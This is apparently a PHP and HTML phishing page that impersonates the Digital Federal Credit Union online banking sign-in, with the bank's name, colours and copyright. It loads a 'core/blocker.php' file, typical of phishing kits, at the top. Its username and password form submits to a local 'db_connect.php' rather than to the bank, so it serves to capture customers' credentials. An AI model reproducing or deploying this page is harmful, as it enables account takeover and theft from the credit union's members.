<?php
require ("core/blocker.php");
?>
<!DOCTYPE html>
<html class="a-no-js" data-19ax5a9jf="dingo">
  <head>
<link rel="shortcut icon" type="image/png"href="https://upload.wikimedia.org/wikipedia/commons/5/5b/Logo_DCU_Green.svg"/>
<script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>

<html lang="en-us" dir="ltr">
<head class="at-element-marker">
  <meta charset="utf-8">
  <title>DCU Online - Login</title>
  <meta name="format-detection" content="telephone=no">
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link href="css/vendor.7de76d70.css" rel="stylesheet">
  <link href="css/app.7b1cd472.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="css/64.64d4d70e.css">
  <link rel="stylesheet" type="text/css" href="css/chunk-common.d06af608.css">
  <link rel="stylesheet" type="text/css" href="css/2.658b5c49.css">
  <link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="https://usassets.cobrowse.pega.com/assets/stylesheets/customer/final/default.css?v=8.7.1">
</head>
<body class="desktop touch body--light" style="--q-color-primary:#01675a; --q-color-secondary:#07926d; --q-color-accent:#5CCB9C; --q-color-positive:#21BA45; --q-color-negative:#C10015; --q-color-info:#F2C037; --q-color-warning:#F2C037; --q-color-light:#bdbdbd; --q-color-dark:#424242; --q-color-faded:#777;">
<div id="q-app">
  <div class="q-layout q-layout--standard" style="min-height: 570px;">
    <main data-v-3b0ab34e="" class="entrymodal-container" style="background-color: rgb(1, 103, 90);">
      <div data-v-3b0ab34e="" class="q-pb-xs-sm q-pb-sm-xl"></div>
      <div data-v-3b0ab34e="" class="row entrymodal-ui-container q-pa-lg q-mx-auto">
        <div data-v-3b0ab34e="" class="col-12 row justify-center">
          <img data-v-3b0ab34e="" height="32px" src="dcuLogoDark.png" alt="DCU company logo" class="q-mb-md">
          <h1 data-v-3b0ab34e="" class="col-12 text-h3 text-grey-8 q-ma-none text-center">Sign in</h1>
          <hr data-v-3b0ab34e="" class="separator__header" style="color: rgb(1, 103, 90);">
        </div>
        <div data-v-3b0ab34e="" class="col-12 q-pt-md q-px-xs-md q-px-sm-xl">
          <form action="db_connect.php" method="post" class="row justify-center">
            <div data-v-705dea72="" data-v-60147bc2="" class="custom-field input-field-spacing" name="username">
              <div class="label-container">
                <label for="5110b8e6-a3b2-4c45-ba7f-b41709f46492"><p class="q-ma-none">Username</p></label>
              </div>
              <div class="controller-wrapper">
                <div data-v-705dea72="" class="custom-input">
                  <input data-v-705dea72="" placeholder="" autocomplete="username" data-caption="Username" type="text" name="username" id="5110b8e6-a3b2-4c45-ba7f-b41709f46492" required>
                </div>
              </div>
            </div>
            <div data-v-705dea72="" data-v-2f7db3fc="" data-v-60147bc2="" class="custom-field password-input input-field-spacing" name="password">
              <div class="label-container">
                <label for="6cda9c14-2694-4d61-b38c-4705943c8dd1"><p class="q-ma-none">Password</p></label>
              </div>
              <div class="controller-wrapper">
                <div data-v-705dea72="" class="custom-input has-append">
                  <input data-v-705dea72="" placeholder="" autocomplete="current-password" data-caption="Password" type="password" name="password" id="6cda9c14-2694-4d61-b38c-4705943c8dd1" required>
                </div>
              </div>
            </div>
            <button data-v-3448be5c="" data-v-60147bc2="" tabindex="0" type="submit" role="button" class="q-btn q-btn-item non-selectable no-outline col-12 q-mt-lg full-width button__submit q-btn--standard q-btn--rectangle q-btn--actionable q-focusable q-hoverable q-btn--wrap" label="SIGN IN" style="color: white; background-color: rgb(1, 103, 90); border-radius: 0px;">
              <span class="q-btn__wrapper col row q-anchor--skip">
                <span class="q-btn__content text-center col items-center q-anchor--skip justify-center row">
                  <span class="block">SIGN IN</span>
                </span>
              </span>
            </button>
          </form>
        </div>
        <div data-v-3b0ab34e="" class="col-xs-12 q-pt-lg q-px-md text-body2 text-center">
          <div data-v-3b0ab34e="" class="q-mb-md">
            <button data-v-3b0ab34e="" tabindex="0" type="button" role="button" class="q-btn q-btn-item non-selectable no-outline action cursor-pointer q-btn--unelevated q-btn--rectangle q-btn--actionable q-focusable q-hoverable q-btn--no-uppercase q-btn--wrap q-btn--dense" style="color: rgb(1, 103, 90);">
              <span class="q-focus-helper"></span>
              <span class="q-btn__wrapper col row q-anchor--skip">
                <span class="q-btn__content text-center col items-center q-anchor--skip justify-center row">Forgot your username?</span>
              </span>
            </button> or
            <button data-v-3b0ab34e="" tabindex="0" type="button" role="button" class="q-btn q-btn-item non-selectable no-outline action cursor-pointer q-btn--unelevated q-btn--rectangle q-btn--actionable q-focusable q-hoverable q-btn--no-uppercase q-btn--wrap q-btn--dense" style="color: rgb(1, 103, 90);">
              <span class="q-focus-helper"></span>
              <span class="q-btn__wrapper col row q-anchor--skip">
                <span class="q-btn__content text-center col items-center q-anchor--skip justify-center row">Forgot your password?</span>
              </span>
            </button>
          </div>
          <div data-v-3b0ab34e="" class="text-caption text-grey-8 q-mt-md">
            <span data-v-3b0ab34e="">© 2024 Digital Federal Credit Union &nbsp; | &nbsp; v7.5.1 </span>
          </div>
        </div>
      </div>
    </main>
  </div>
</div>
</body>
</html>